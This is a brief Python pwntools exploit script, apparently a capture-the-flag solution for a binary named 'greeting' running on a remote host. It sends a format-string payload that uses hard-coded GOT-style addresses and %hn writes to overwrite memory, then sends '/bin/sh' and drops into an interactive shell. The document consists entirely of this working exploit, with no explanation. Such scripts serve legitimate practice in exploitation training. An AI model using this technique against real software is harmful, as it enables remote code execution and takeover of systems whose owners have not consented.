#!/usr/bin/env python
# coding=utf-8
from pwn import*
#a=process("./greeting")
a=remote("111.198.29.45","39804")
offset=12
a.recvuntil("Please tell me your name... ")
elf=ELF("./greeting")
payload='aa\x34\x99\x04\x08\x56\x9a\x04\x08\x54\x9a\x04\x08%34000c%12$hn%33556c%13$hn%31884c%14$hn'
a.sendline(payload)

a.recv()
a.sendline("/bin/sh\x00")

a.interactive()
